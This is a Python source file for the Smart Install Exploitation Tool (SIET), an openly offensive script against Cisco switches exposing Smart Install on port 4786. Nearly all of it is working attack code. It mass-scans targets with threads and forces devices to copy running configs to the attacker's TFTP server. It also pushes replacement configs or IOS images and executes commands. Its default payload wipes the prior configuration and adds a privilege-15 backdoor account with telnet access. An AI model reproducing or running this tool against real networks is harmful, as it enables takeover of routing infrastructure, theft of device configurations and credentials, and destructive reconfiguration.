#!/usr/bin/env python
""" SMART INSTALL EXPLOITATION TOOL(SIET) """
import argparse
import socket
import os
import shutil
import ntpath
import sys
import subprocess
import time
import threading
from codecs import encode
from codecs import decode
pyVer = sys.version_info[0]
try:
  import Queue as queue
except ImportError:
  import queue


def getArgmFromUser():
  """ Set command line arguments """
  parser = argparse.ArgumentParser()
  ipHelp = "Set ip-address of client"
  liHelp = "Set file with list of target IP"
  tsHelp = "Only test for smart install"
  geHelp = "Get cisco configuration file from device and store it in conf/ directory"
  chHelp = "Install a new configuration file to the remote device"
  cmHelp = "Install new configuration files to multiple remote devices"
  upHelp = "Updating IOS on the remote device"
  exHelp = "Execute code on device (new IOS versions: 3.6.0E+ & 15.2(2)E+"
  thHelp = "Number of threads to be spawned (default: %(default)s)\n\n"
  parser.add_argument("-i", "--ip", dest="IP", help=ipHelp)
  parser.add_argument("-l", "--list_ip", dest="list_IP", help=liHelp)
  parser.add_argument("-t", "--test", dest="mode", const="test", action="store_const", help=tsHelp)
  parser.add_argument("-g", "--get_config", dest="mode", const="get_config", action="store_const", help=geHelp)
  parser.add_argument("-c", "--change_config", dest="mode", const="change_config", action="store_const", help=chHelp)
  parser.add_argument("-a", "--change_multi", dest="mode", const="change_multi", action="store_const", help=cmHelp)
  parser.add_argument("-u", "--update_ios", dest="mode", const="update_ios", action="store_const", help=upHelp)
  parser.add_argument("-e", "--execute", dest="mode", const="execute", action="store_const", help=exHelp)
  parser.add_argument("-r", "--thread-count", metavar="", default=100, type=int, help=thHelp)
  args = parser.parse_args()
  if args.mode is None:
    parser.print_help()
    sys.exit(0)
  return args


def getTimeFromUser():
  """ Time setting before device reload and apply your configuration file """
  while True:
    tt = input('[INPUT]: Please enter timeout before reload [HH:MM]:')
    sHH = tt[0:2]
    sMM = tt[3:5]
    if ((sHH + sMM).isdigit() == 0) or (int(sHH) > 23) or (int(sMM) > 60) or (':' not in tt):
      print('[ERROR]: Invalid time!')
      continue
    break
  return tt[0:5]


def getFileForTftp(mode):
  """ Creating directories, configuration files and execute files """
  ask_banr = """[INPUT]: Enter full cisco configuration/execute file path, or press "d"
             for default (be attention here, default file destroy previous configuration): """
  ask_file = input(ask_banr)
  if ask_file == 'd':
    args = getArgmFromUser()
    try:
      cUser = input('[INPUT]: Enter username or press enter for "cisco": ') or 'cisco'
      cPass = input('[INPUT]: Enter password or press enter for "cisco": ') or 'cisco'
      if mode == 'config':
        f = open('tftp' + '/' + 'default.conf', 'wb')
        f.write('username ' + cUser + ' privilege 15 secret 0 ' + cPass + '\n' + 'interface Vlan1\n ip address ' +
                args.IP + ' ' + '255.255.255.0' + '\n no shutdown\n' + 'line vty 0 4\n login local\n transport input telnet\nend\n')
        f.close()
        nfile = 'default.conf'
      elif mode == 'execute':
        f = open('tftp' + '/' + 'execute.txt', 'wb')
        f.write('"username ' + cUser + ' privilege 15 secret 0 ' + cPass + '"' + ' "exit"')
        f.close()
        nfile = 'execute.txt'
    except (IOError, OSError) as why:
      print(str(why))
      print('[ERROR]: Check the file and try again.')
      sys.exit()
  else:
    try:
      if mode == 'config':
        shutil.copy2(str(ask_file), 'tftp/my.conf')
        nfile = 'my.conf'
      elif mode == 'execute':
        shutil.copy2(str(ask_file), 'tftp/my_exec.txt')
        nfile = 'my_exec.txt'

    except (IOError, OSError) as why:
      print(str(why))
      print('[ERROR]: Check the file and try again.')
      sys.exit()

  print('[INFO]: File created: ' + nfile)
  return nfile


def getIosForTftp():
  """ Creating nessesary files for IOS update """
  try:
    ios_image = input('[INPUT]: Enter canonical path for the cisco IOS image(tar) file: ')
    shutil.copy2(str(ios_image), 'tftp/')
    ios_image_name = ntpath.basename(ios_image)
    if os.path.exists('tftp/tar_imglist0.txt'):
      os.remove('tftp/tar_imglist0.txt')
    f = open('tftp' + '/' + 'tar_imglist0.txt', 'wb')
    f.write(str(ios_image_name))
    f.close()
  except (IOError, OSError) as why:
    print(str(why))
    print('[ERROR]: Check the file and try again.')
    sys.exit()


def connWithClient(data, ip, mode=0):
  """ Set connection with remote client """
  args = getArgmFromUser()
  try:
    conn_with_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn_with_host.settimeout(5)
    conn_with_host.connect((ip, 4786))
    my_ip = (conn_with_host.getsockname()[0])
    if data:
      conn_with_host.send(data)
      if mode == 0:
        conn_with_host.close()
        print('[INFO]: Package send success to %s: ' % ip)
      elif mode == 1:
        resp = '0' * 7 + '4' + '0' * 8 + '0' * 7 + '3' + '0' * 7 + '8' + '0' * 7 + '1' + '0' * 8
        while True:
          data = conn_with_host.recv(512)
          if len(data) < 1:
            print('[INFO]: Smart Install Director feature active on {0}'.format(ip))
            print('[INFO]: {0} is not affected'.format(ip))
            break
          elif len(data) == 24:
            if hexEncode(data) == resp:
              print('[INFO]: Smart Install Client feature active on {0}'.format(ip))
              print('[INFO]: {0} is affected'.format(ip))
              break
            else:
              print('[ERROR]: Unexpected response received, Smart Install Client feature might be active on {0}'.format(ip))
              print('[INFO]: Unclear whether {0} is affected or not'.format(ip))
              break
          else:
            print('[ERROR]: Unexpected response received, Smart Install Client feature might be active on {0}'.format(ip))
            print('[INFO]: Unclear whether {0} is affected or not'.format(ip))
            break

        conn_with_host.close()

    return my_ip

  except KeyboardInterrupt:
    print('[INFO]: You pressed Ctrl+C, exit.')
    sys.exit()

  except socket.gaierror:
    print('[ERROR]: Hostname could not be resolved, exit.')
    sys.exit()

  except socket.error:
    if args.IP:
      print("[ERROR]: Couldn't connect to %s, exit." % ip)
      sys.exit()
    elif args.list_IP:
      print("[ERROR]: Couldn't connect to %s, next." % ip)


def testDevice(current_ip):
  """ Testing for smart install """
  sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '4' + '0' * 7 + '8' + '0' * 7 + '1' + '0' * 8
  # print('[DEBUG]: Packet for sent: ' + sTcp)
  print('[INFO]: Sending TCP packet to %s ' % current_ip)
  # print('[DEBUG]: Decoded packet to sent: ' + hexDecode(sTcp))
  connWithClient(hexDecode(sTcp), current_ip, mode=1)


def testDeviceScheduler(hosts_to_scan_queue):
  """ Test scheduler """
  while not hosts_to_scan_queue.empty():
    host = hosts_to_scan_queue.get()
    testDevice(host)
    hosts_to_scan_queue.task_done()


def changeTftp(mode, current_ip):
  """ Send package for changing tftp address """
  my_ip = connWithClient(None, current_ip)
  if not my_ip:
    my_ip = socket.gethostbyname(socket.gethostname())
  if mode == 'change_config':
    config_file = getFileForTftp('config')
    fConf = 'tftp://' + my_ip + '/' + config_file
    sTime = getTimeFromUser()
    sDump1 = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '3' + '0' * 5 + '128' + '0' * 7 + '3' + '0' * 23 + '2' + '0' * 15 + '1' + '0' * 6
    sDump2 = '0' * (264 - len(fConf) * 2)
    sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + hexEncode(fConf) + sDump2
  elif mode == 'change_multi':
    if not os.path.isdir("tftp/conf") and not os.path.exists("tftp/conf"):
      os.mkdir('tftp/conf', 0o755)
    config_file = 'conf/' + current_ip + '.conf'
    fConf = 'tftp://' + my_ip + '/' + config_file
    sTime = '00:01'
    sDump1 = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '3' + '0' * 5 + '128' + '0' * 7 + '3' + '0' * 23 + '2' + '0' * 15 + '1' + '0' * 6
    sDump2 = '0' * (264 - len(fConf) * 2)
    sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + hexEncode(fConf) + sDump2
  elif mode == 'get_config':
    # need more test with this payload ( "system:" may be more usefull then "nvram:"
    # c1 = 'copy nvram:startup-config flash:/config.text'
    # c2 = 'copy nvram:startup-config tftp://' + my_ip + '/' + current_ip + '.conf'
    c1 = 'copy system:running-config flash:/config.text'
    c2 = 'copy flash:/config.text tftp://' + my_ip + '/' + current_ip + '.conf'
    c3 = ''
    sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'
    sTcp = sTcp + hexEncode(c1) + '00' * (336 - len(c1))
    sTcp = sTcp + hexEncode(c2) + '00' * (336 - len(c2))
    sTcp = sTcp + hexEncode(c3) + '00' * (336 - len(c3))

  elif mode == 'update_ios':
    getIosForTftp()
    sTime = getTimeFromUser()
    fList = 'tftp://' + my_ip + '/tar_imglist0.txt'
    sTcp = '%08x' % 1 + '%08x' % 1 + '%08x' % 2 + '%08x' % 0x1c4 + '%08x' % 2
    if sTime == '00:00':
      sTcp += '%08x' % 0x821 + '%024x' % 1 + '%032x' % 1
    else:
      sTcp += '%08x' % 0x801 + '%024x' % 0 + '%08x' % 1 + '%08x' % int(sTime[0:2]) + '%08x' % int(sTime[3:5]) + '%08x' % 1
    sTcp += hexEncode(fList) + '00' * (415 - len(fList)) + '01'
  elif mode == 'execute':
    exec_file = getFileForTftp('execute')
    c1 = ''
    c2 = ''
    c3 = 'tftp://' + my_ip + '/' + exec_file
    sTcp = '%08d' % 2 + '%08d' % 1 + '%08d' % 5 + '%08d' % 210 + '%08d' % 1
    sTcp = sTcp + hexEncode(c1) + '00' * (128 - len(c1))
    sTcp = sTcp + hexEncode(c2) + '00' * (264 - len(c2))
    sTcp = sTcp + hexEncode(c3) + '00' * (131 - len(c3)) + '01'
  # print('[DEBUG]: Packet for sent: ' + sTcp)
  print('[INFO]: Sending TCP packet to %s ' % current_ip)
  # print('[DEBUG]: Decoded packet to sent: ' + hexDecode(sTcp))
  connWithClient(hexDecode(sTcp), current_ip)


def hexEncode(toEncode):
  """ Version-agnostic function to encode hex strings """
  enc = None
  if pyVer == 2:
    enc = toEncode.encode('hex')
  elif pyVer == 3:
    enc = encode(bytes(toEncode, 'ascii'), 'hex').decode()
  return enc


def hexDecode(toDecode):
  """ Version-agnostic function to decode hex strings """
  dec = None
  if pyVer == 2:
    dec = toDecode.decode('hex')
  elif pyVer == 3:
    dec = decode(toDecode, 'hex')
  return dec


def main():
  """ where are the things happens """
  args = getArgmFromUser()
  if args.mode == 'test':
    if args.list_IP:
      hosts_to_scan_queue = queue.Queue()
      with open(args.list_IP, 'r') as myList:
        for line in myList:
          hosts_to_scan_queue.put(line.strip())
      try:
        threads = []
        for _ in range(args.thread_count):
          thread = threading.Thread(target=testDeviceScheduler, args=(hosts_to_scan_queue,))
          threads.append(thread)
          thread.daemon = True
          thread.start()
      except BaseException as err:
        print('[ERROR]: Taking down all testing threads!')
        print(err)
      finally:
        for thread in threads:
          thread.join()
    else:
      current_ip = args.IP
      testDevice(current_ip)
  else:
    tftp = subprocess.Popen(["python", "sTFTP.py"])
    if args.mode != 'change_multi' and args.mode != 'get_config':
      current_ip = args.IP
      changeTftp(args.mode, current_ip)
    elif args.mode == 'change_multi' or args.mode == 'get_config':
      if args.IP:
        current_ip = args.IP
        changeTftp(args.mode, current_ip)
      elif args.list_IP:
        try:
          def worker():
            while True:
              ip = q.get()
              changeTftp(args.mode, ip)
              q.task_done()
          q = queue.Queue()
          with open(args.list_IP, 'r') as myList:
            for line in myList:
              ip = line.strip()
              if ip:
                q.put(ip)
          for t in range(args.thread_count):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
          q.join()
        except (IOError, OSError) as why:
          print(str(why))
          print('[ERROR]: Check the file and try again.')
          sys.exit()
        except TypeError:
          pass
        except KeyboardInterrupt:
          print('[INFO]: You pressed Ctrl+C, exit.')
          sys.exit()
      if args.mode == 'get_config':
        print('[INFO]: Getting config done')
      elif args.mode == 'change_multi':
        print('[INFO]: Packet sent, next')
    else:
      print('[ERROR]: Choose the tool mode (test/get_config/change_config/update_ios/execute)')
    print('[INFO]: All done! Waiting 60 seconds for end of connections...')
    time.sleep(60)
    tftp.terminate()


main()
